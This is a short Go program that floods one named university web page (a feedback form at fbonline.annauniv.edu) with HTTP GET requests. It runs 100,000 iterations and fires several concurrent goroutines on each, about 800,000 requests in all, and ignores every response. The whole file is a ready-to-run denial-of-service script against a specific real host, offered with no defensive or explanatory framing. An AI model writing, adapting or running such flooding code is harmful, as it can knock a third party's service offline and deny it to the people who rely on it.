package main

import (
	"fmt"
	"net/http"
)

func getRequest() {
	http.Get("http://fbonline.annauniv.edu:8080/fb/sfb_id.jsp")
}
func main() {
	for i := 0; i < 100000; i++ {
		fmt.Printf("Request number:%v\n", i+1)
		getRequest()
		go getRequest()
		go getRequest()
		go getRequest()
		go getRequest()
		go getRequest()
		go getRequest()
		go getRequest()
	}
}
